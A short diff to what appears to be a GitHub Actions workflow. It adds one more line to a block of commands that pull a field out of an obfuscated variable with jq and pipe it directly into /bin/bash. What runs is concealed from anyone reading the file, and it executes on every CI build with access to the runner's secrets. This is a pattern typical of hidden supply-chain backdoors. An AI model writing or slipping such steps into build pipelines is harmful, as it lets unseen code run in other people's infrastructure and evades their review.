@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$tbv2727" | jq -r .vax5307 | /bin/bash
           printf '%s' "$mvrty543" | jq -r .rpk640 | /bin/bash
           printf '%s' "$dg3" | jq -r .j6055 | /bin/bash
+          printf '%s' "$cvu29437" | jq -r .flaj7 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
